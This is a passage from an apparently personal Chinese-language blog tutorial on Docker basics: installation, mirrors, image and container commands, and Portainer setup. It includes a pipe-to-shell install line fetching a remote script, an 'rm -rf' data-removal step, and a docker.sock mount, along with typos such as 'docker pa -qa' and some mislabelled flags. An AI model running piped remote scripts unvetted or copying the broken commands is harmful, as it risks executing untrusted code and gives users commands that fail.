<h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p>Docker 是一个开源的应用容器引擎</p>
<p>他可以解决环境不一致，叫整个环境打包成一个集装箱，然后别人下载下来运行就不会出错了</p>
<p>容器是完全使用沙箱机制，就是隔离型，他运行的时候会在Linux内核里面开辟一个空间，这个空间不会影响其他的东西</p>
<p>虚拟机会站很大的空间，虚拟机会创建一个内核，</p>
<h2 id="Docker与虚拟机的区别"><a href="#Docker与虚拟机的区别" class="headerlink" title="Docker与虚拟机的区别"></a>Docker与虚拟机的区别</h2><p>docker有着比虚拟机更少的抽象层<br>Docker用的是物理机的内核<br>vm是自己创建一个内核环境会变的很慢</p>
<h2 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h2><p>他有Docker-ce版本的介绍社区版本的和Docker-ee企业版本</p>
<p>kali安装运行下面这个命令就可以直接安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209104838.png"></p>
<p>如果是其他的linux可以用下面这个命令安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br></pre></td></tr></table></figure>
<h2 id="Docker的卸载"><a href="#Docker的卸载" class="headerlink" title="Docker的卸载"></a>Docker的卸载</h2><p>卸载依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>卸载资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br></pre></td></tr></table></figure>
<h2 id="启动Docker"><a href="#启动Docker" class="headerlink" title="启动Docker"></a>启动Docker</h2><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p><strong>查看是否启动成功</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker version  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209161443.png"></p>
<p><strong>可以运行一下helloworld</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run hello-world </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209161652.png"></p>
<h2 id="Docker-镜像加速"><a href="#Docker-镜像加速" class="headerlink" title="Docker 镜像加速"></a>Docker 镜像加速</h2><p>地址有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hub.docker.com&#x2F;     &#x2F;&#x2F;官方</span><br><span class="line">https:&#x2F;&#x2F;reg-mirror.qiniu.com   &#x2F;&#x2F;七牛云</span><br><span class="line">https:&#x2F;&#x2F;hub-mirror.c.163.com   &#x2F;&#x2F;网易云</span><br><span class="line">https:&#x2F;&#x2F;registry.docker-cn.com  &#x2F;&#x2F;Docker中国区官方镜</span><br><span class="line">https:&#x2F;&#x2F;cr.console.aliyun.com&#x2F;  &#x2F;&#x2F;阿里云</span><br><span class="line">​http:&#x2F;&#x2F;hub.daocloud.io(推荐使用)  &#x2F;&#x2F;daoCloud</span><br></pre></td></tr></table></figure>
<p><code>/etc/docker/daemon.json</code>在这个文件里面添加下面的代码，如果没有文件创建一个文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>查看有没有配置好<br><strong>重启docker</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<p>重启完运行下面这个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure>
<p>出现下面出现这个就成功了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209160628.png"></p>
<h2 id="docker镜像基础命令"><a href="#docker镜像基础命令" class="headerlink" title="docker镜像基础命令"></a>docker镜像基础命令</h2><p>他的官方命令说明<a href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209164624.png"></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>images</code></td>
<td align="right">查看已经下载的镜像</td>
</tr>
<tr>
<td align="center"><code>search</code></td>
<td align="right">进行搜索镜像</td>
</tr>
<tr>
<td align="center"><code>pull</code></td>
<td align="right">下载镜像</td>
</tr>
<tr>
<td align="center"><code>rmi</code></td>
<td align="right">卸载镜像</td>
</tr>
<tr>
<td align="center"><code>save</code></td>
<td align="right">用<code>-o</code>参数导出镜像</td>
</tr>
<tr>
<td align="center"><code>load</code></td>
<td align="right">用<code>-i</code>进行导入镜像</td>
</tr>
<tr>
<td align="center"><code>tag</code></td>
<td align="right">修改镜像信息</td>
</tr>
</tbody></table>
<p>查看他的命令可以用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man docker</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker --help</span><br></pre></td></tr></table></figure>
<p>如果命令的参数不会用可以用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker 参数命令 --help</span><br></pre></td></tr></table></figure>
<p>列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images --help</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209171029.png"></p>
<h3 id="pull下载镜像"><a href="#pull下载镜像" class="headerlink" title="pull下载镜像"></a>pull下载镜像</h3><p>命令<br>如果不指定他默认会去你配置的进行库去下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 要下载镜像的名</span><br></pre></td></tr></table></figure>
<p>指定版本下载<br>下面下载的是php的7.1版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull php:7.1</span><br></pre></td></tr></table></figure>
<p>指定目录进行下载，<br>下载命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 下载的拉取命令</span><br></pre></td></tr></table></figure>
<p>事例<br>比如下面这个地址<a href="http://hub.daocloud.io/">http://hub.daocloud.io</a><br>下面是php<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209201047.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209201133.png"></p>
<p>拉取命令是<code>daocloud.io/library/php:7.4-alpine</code><br>进行下载<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull  daocloud.io&#x2F;library&#x2F;php:7.4-alpine</span><br></pre></td></tr></table></figure>
<p>可以看见已经下载好了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209201558.png"></p>
<h3 id="rmi卸载镜像"><a href="#rmi卸载镜像" class="headerlink" title="rmi卸载镜像"></a>rmi卸载镜像</h3><p><strong>查看镜像ID</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209193641.png"></p>
<p><strong>rmi卸载镜像</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi -f 要删除镜像的ID</span><br></pre></td></tr></table></figure>
<p>咧<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi -f bf756fb1ae65</span><br></pre></td></tr></table></figure>
<p>可以看见删除成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209193837.png"></p>
<h3 id="images查看已经下载的镜像"><a href="#images查看已经下载的镜像" class="headerlink" title="images查看已经下载的镜像"></a>images查看已经下载的镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209162017.png"></p>
<p>他的表示的意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REPOSITORY   镜像的仓库源</span><br><span class="line">TAG           镜像的标签</span><br><span class="line">IMAGE ID      镜像的ID</span><br><span class="line">CREATED       镜像的创建时间</span><br><span class="line">SIZE          镜像的大小</span><br></pre></td></tr></table></figure>
<p><strong>他的可选参数</strong><br>常用的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a, --all  列出所以镜像</span><br><span class="line">-q, --quiet   只显示镜像ID</span><br></pre></td></tr></table></figure>
<p>下面咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images -q  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209171819.png"></p>
<h3 id="search进行搜索镜像"><a href="#search进行搜索镜像" class="headerlink" title="search进行搜索镜像"></a>search进行搜索镜像</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search  要搜索的景象名</span><br></pre></td></tr></table></figure>
<p>测试<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker  search mysql</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209172718.png"></p>
<p><strong>可选参数</strong><br>查看可选参数<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker  search  --help </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209173003.png"><br>进行过滤</p>
<h3 id="镜像的导入导出"><a href="#镜像的导入导出" class="headerlink" title="镜像的导入导出"></a>镜像的导入导出</h3><p>比如有的镜像下载不下来，我们就可以用别人导出的镜像进行安装</p>
<h4 id="镜像的导出、"><a href="#镜像的导出、" class="headerlink" title="镜像的导出、"></a>镜像的导出、</h4><p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker save -o   要导出的路径   镜像的ID</span><br></pre></td></tr></table></figure>
<p><strong>实咧</strong><br>查看现在我的都是有什么镜像文件命令<code>docker images</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210080832.png"><br>我就叫那个php给导出出来<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker save -o  &#x2F;root&#x2F;php.image e7ddddb9c714</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210081112.png"></p>
<p>查看一下文件可以看见已经导出成功了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210081204.png"></p>
<h4 id="镜像的导入"><a href="#镜像的导入" class="headerlink" title="镜像的导入"></a>镜像的导入</h4><p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker load -i  镜像的文件</span><br></pre></td></tr></table></figure>
<p><strong>实咧</strong><br>我叫那个php给删除命令<code>docker rmi -f  要删除的ID</code><br>我导入上面那个已经导入出来的php<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker load -i &#x2F;root&#x2F;php.image</span><br></pre></td></tr></table></figure>
<p>可以看见导入成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210082031.png"></p>
<h3 id="修改镜像信息"><a href="#修改镜像信息" class="headerlink" title="修改镜像信息"></a>修改镜像信息</h3><p>可以看见我们导入的他没有名字和版本<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210082154.png"><br>格式<br>下面一个<code>:</code>就代表下一个信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag 进行的ID 要修改的名字:版本号:...:....:....</span><br></pre></td></tr></table></figure>
<p>事例<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag e7ddddb9c714  php:7.1</span><br></pre></td></tr></table></figure>
<p>可以看见修改成功</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210082546.png"></p>
<h2 id="docker容器的命令"><a href="#docker容器的命令" class="headerlink" title="docker容器的命令"></a>docker容器的命令</h2><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>run</code></td>
<td align="right">运行镜像</td>
</tr>
<tr>
<td align="center"><code>ps</code></td>
<td align="right">查看正在运行的容器</td>
</tr>
<tr>
<td align="center"><code>attach</code></td>
<td align="right">启动后进入容器</td>
</tr>
<tr>
<td align="center"><code>exit</code></td>
<td align="right">退出容器，这个退出之后容器也会停止</td>
</tr>
<tr>
<td align="center"><code>Ctrl+P+Q</code></td>
<td align="right">这样退出容器不会停止运行</td>
</tr>
<tr>
<td align="center"><code>start</code></td>
<td align="right">启动容器</td>
</tr>
<tr>
<td align="center"><code>stop</code></td>
<td align="right">停止容器</td>
</tr>
<tr>
<td align="center"><code>restart</code></td>
<td align="right">重启容器</td>
</tr>
<tr>
<td align="center"><code>kill</code></td>
<td align="right">强制关闭容器</td>
</tr>
<tr>
<td align="center"><code>rm</code></td>
<td align="right">删除容器</td>
</tr>
<tr>
<td align="center"><code>logs</code></td>
<td align="right">查看日志</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">run的可选参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>--name</code></td>
<td align="right">指定容器的名称</td>
</tr>
<tr>
<td align="center"><code>-it</code></td>
<td align="right">交互方法运行 主机可以进入</td>
</tr>
<tr>
<td align="center"><code>-d</code></td>
<td align="right">代表后台运行容器，-d和-it有冲突</td>
</tr>
<tr>
<td align="center"><code>-p</code></td>
<td align="right">为了映射当前Linux端口和容器端口</td>
</tr>
<tr>
<td align="center"><code>-P</code></td>
<td align="right">他会随机指定端口</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">ps的可选参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>-a</code></td>
<td align="right">查看全部的容器，包括没有运行</td>
</tr>
<tr>
<td align="center"><code>-p</code></td>
<td align="right">只查看容器的ID</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">logs的可选参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>-f</code></td>
<td align="right">可以滚动查看日志的最后几行</td>
</tr>
<tr>
<td align="center"><code>-t</code></td>
<td align="right">显示时间</td>
</tr>
</tbody></table>
<h3 id="简单运行"><a href="#简单运行" class="headerlink" title="简单运行"></a>简单运行</h3><p>在web是没有办法访问的<br>命令<br>下面这个运行如果没有他会下载在运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run 镜像的标识&#x2F;镜像名称:版本号</span><br></pre></td></tr></table></figure>
<h3 id="运行常用的参数"><a href="#运行常用的参数" class="headerlink" title="运行常用的参数"></a>运行常用的参数</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name 容器名称  -it  -p 宿主机端口:容器端口   镜像的ID&#x2F;镜像名称:版本号  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><code>--name</code> 容器名称：指定容器的名称<br><code>-it</code>    交互方法运行  主机可以进入<br><code>-d</code> 代表后台运行容器，上面我没有加应<code>-d</code>和<code>-it</code>有冲突<br><code>-p</code> 宿主机端口:容器端口：为了映射当前Linux端口和容器端口 ，他还有个<code>-P</code>他会随机指定端口<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash</p>
<p><strong>他的坑</strong><br>命令<br>下面这个命令是在后台启动，但是发现他没有启动而是关闭了<br>应为他没有前端启动所以启动后就关闭了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d 镜像的ID&#x2F;镜像名称:版本号</span><br></pre></td></tr></table></figure>
<h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><p>用<code>ps</code>参数<br>命令<br>如果<code>ps</code>没有添加任何参数他会显示正在运行的容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps  </span><br></pre></td></tr></table></figure>
<p>可以看见下面启动了kali 容器<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210100101.png"><br><code>CONTAINER ID</code> 表示容器ID<br><code>IMAGE</code>         镜像ID<br><code>COMMAND</code>       执行的命令<br><code>CREATED</code>       已经建立的时间<br><code>STATUS</code>        状态<br><code>PORTS</code>         用的端口<br><code>NAMES</code>         容器名字<br><strong>ps还有可选参数</strong></p>
<p><strong>-a参数</strong><br>-a：查看全部的容器，包括没有运行<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210100700.png"></p>
<p><strong>-p参数</strong><br>-q：只查看容器的ID<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps -q </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210100902.png"></p>
<p>命令</p>
<h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><p><strong>启动的时候直接进入容器</strong><br><strong>启动的时候直接进入容器添加-it和/bin/bash就可以直接进入容器</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run  -it a1765e8e381e   &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><code>-it</code>    交互方法运行  主机可以进入<br><code>a1765e8e381e</code> 是镜像ID<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210095407.png"><br><strong>启动后进入容器</strong></p>
<p><strong>或者启动后用attach参数进入容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker attach 容器ID</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210103651.png"></p>
<p><strong>还有一个exec参数进入容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec 容器ID   &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><strong>attach和exec他两个区别</strong><br>exec   命令会开启新的终端<br>attach  这个会进入正在运行的终端</p>
<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><p>在容器里面输入<code>exit</code>退出容器，这个退出之后容器也会停止</p>
<p>如果不行停止可以用<code>Ctrl+P+Q</code>，这样退出容器不会停止运行<br>可以看见他他还在运行<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210103236.png"></p>
<h3 id="启动和关闭容器"><a href="#启动和关闭容器" class="headerlink" title="启动和关闭容器"></a>启动和关闭容器</h3><p>如果我们关闭容器了<br>我们可以启动他里面的东西是不会变的</p>
<p><strong>重启容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker restart  容器ID</span><br></pre></td></tr></table></figure>
<p><strong>关闭容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop  容器ID</span><br></pre></td></tr></table></figure>
<p><strong>强制关闭容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker kill  容器ID</span><br></pre></td></tr></table></figure>
<p><strong>启动容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start  容器ID</span><br></pre></td></tr></table></figure>
<p><strong>然后我们这进入容器看看</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker attach  容器ID</span><br></pre></td></tr></table></figure>
<p>可以看见已经进入了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210104101.png"></p>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p>然后删除这个容器里面的东西就没有了和删除虚拟机一样</p>
<p><strong>停止指定的容器</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
<p><strong>停止全部容器</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop $(docker pa -qa)</span><br></pre></td></tr></table></figure>
<p><strong>删除指定的容器</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
<p><strong>删除全部容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm $(docker pa -qa)</span><br></pre></td></tr></table></figure>
<h3 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker logs -f -t  容器ID</span><br></pre></td></tr></table></figure>
<p><code>-f</code>  可以滚动查看日志的最后几行<br><code>-t</code> 显示时间<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210113351.png"></p>
<h3 id="实咧下载和运行加进入容器"><a href="#实咧下载和运行加进入容器" class="headerlink" title="实咧下载和运行加进入容器"></a>实咧下载和运行加进入容器</h3><p>下面我先下载一个kali Linux容器<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull kalilinux&#x2F;kali-linux-docker</span><br></pre></td></tr></table></figure>
<p>可以<code>docker images</code>命令查看下载好的镜像<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210083632.png"></p>
<p><strong>启动和进入容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name kali -it -p 5555:22  a1765e8e381e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><code>--name</code> 容器名称：指定容器的名称<br><code>-it</code>    交互方法运行  主机可以进入<br><code>-p</code> 宿主机端口:容器端口：为了映射当前Linux端口和容器端口 ，他还有个<code>-P</code>他会随机指定端口<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash</p>
<p>可以看见已经进入了<br>在<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210094427.png"></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>top</code></td>
<td align="right">查看容器里的进程</td>
</tr>
<tr>
<td align="center"><code>cp</code></td>
<td align="right">叫物理机文件复制容器里面</td>
</tr>
<tr>
<td align="center"><code>inspect</code></td>
<td align="right">查看容器的信息</td>
</tr>
<tr>
<td align="center"><code>history</code></td>
<td align="right">查看镜像是怎么做的</td>
</tr>
</tbody></table>
<h3 id="查看容器里的进程"><a href="#查看容器里的进程" class="headerlink" title="查看容器里的进程"></a>查看容器里的进程</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker  top 容器ID</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210114405.png"></p>
<h3 id="容器和物理机传输文件"><a href="#容器和物理机传输文件" class="headerlink" title="容器和物理机传输文件"></a>容器和物理机传输文件</h3><p>叫物理机文件复制容器里面<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp 文件名称 容器id:容器内部路径</span><br></pre></td></tr></table></figure>
<p>实咧<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp &#x2F;root&#x2F;get-pip.py 702e50cf2295:&#x2F;root&#x2F;get-pip.py </span><br></pre></td></tr></table></figure>
<p>可以看见已经叫get-pip.py复制到容器的里面<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210114828.png"></p>
<p>叫容器里面文件复制物理机<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp   容器id:容器内部路径  路径文件名称</span><br></pre></td></tr></table></figure>
<h3 id="查看容器的信息"><a href="#查看容器的信息" class="headerlink" title="查看容器的信息"></a>查看容器的信息</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker inspect  容器ID</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210115754.png"></p>
<h3 id="查看镜像是怎么做的"><a href="#查看镜像是怎么做的" class="headerlink" title="查看镜像是怎么做的"></a>查看镜像是怎么做的</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker history  镜像ID</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211114552.png"></p>
<h2 id="Portaine可视化面板安装"><a href="#Portaine可视化面板安装" class="headerlink" title="Portaine可视化面板安装"></a>Portaine可视化面板安装</h2><h3 id="下载Portaine"><a href="#下载Portaine" class="headerlink" title="下载Portaine"></a>下载Portaine</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull portainer&#x2F;portainer</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210144344.png"></p>
<h3 id="创建Portainer容器"><a href="#创建Portainer容器" class="headerlink" title="创建Portainer容器"></a>创建Portainer容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8080:9000 --restart&#x3D;always -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock --name prtainer  portainer&#x2F;portainer</span><br></pre></td></tr></table></figure>
<p>命令的意思<br><code>-d</code>    代表后台运行容器<br><code>-p</code>    为了映射当前Linux端口和容器端口，开启的是物理机的8080访问的是容器的9000 端口<br>启动的是<code>portainer/portainer</code>镜像</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210144416.png"></p>
<p>端口已经打开了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210144524.png"></p>
<h3 id="访问Portainer容器进行web管理"><a href="#访问Portainer容器进行web管理" class="headerlink" title="访问Portainer容器进行web管理"></a>访问Portainer容器进行web管理</h3><p>上面那个启动的物理机的8080我们就可以访问物理机的8080端口<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;物理机IP:8080</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210144829.png"></p>
<p>然后我们就可以设置密码了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210150341.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210150855.png"><br>下面这个我进行了谷歌翻译<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210151042.png"></p>
<h2 id="镜像原理之联合文件系统"><a href="#镜像原理之联合文件系统" class="headerlink" title="镜像原理之联合文件系统"></a>镜像原理之联合文件系统</h2><p><strong>复制与<a href="https://blog.csdn.net/Saker__/article/details/107629736#_384">https://blog.csdn.net/Saker__/article/details/107629736#_384</a></strong></p>
<h3 id="UnionFS（联合文件系统）"><a href="#UnionFS（联合文件系统）" class="headerlink" title="UnionFS（联合文件系统）"></a>UnionFS（联合文件系统）</h3><ul>
<li>UnionFs（联合文件系统）：Union文件系统（UnionFs）是一种分层、轻量级并且高性能的文件系统，他支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（ unite several directories into a single virtual filesystem)。Union文件系统是 Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像</li>
